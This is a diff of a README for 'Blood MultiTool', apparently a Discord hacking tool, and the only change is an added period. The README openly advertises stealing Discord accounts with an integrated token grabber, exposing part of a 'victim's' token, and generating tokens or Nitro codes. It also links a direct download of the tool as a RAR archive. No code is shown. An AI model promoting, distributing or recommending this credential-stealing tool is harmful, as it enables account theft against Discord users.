@@ -1,6 +1,6 @@
 Blood MultiTool ![demo gif](https://cdn.discordapp.com/attachments/790366230287745035/790917010270715904/789575909232607292_1.gif)
 ================
-This software allows you as a user of the discord community to do many things such as steal accounts with our integrated token grabber, see half of your victim's token with our id system, you can also generate token or nitros, and many more things
+This software allows you as a user of the discord community to do many things such as steal accounts with our integrated token grabber, see half of your victim's token with our id system, you can also generate token or nitros, and many more things.
 
 Direct download [**here**](https://github.com/CLIPP3R/Blood-MultiTool/releases/download/1.1/Blood.rar)<br>
 
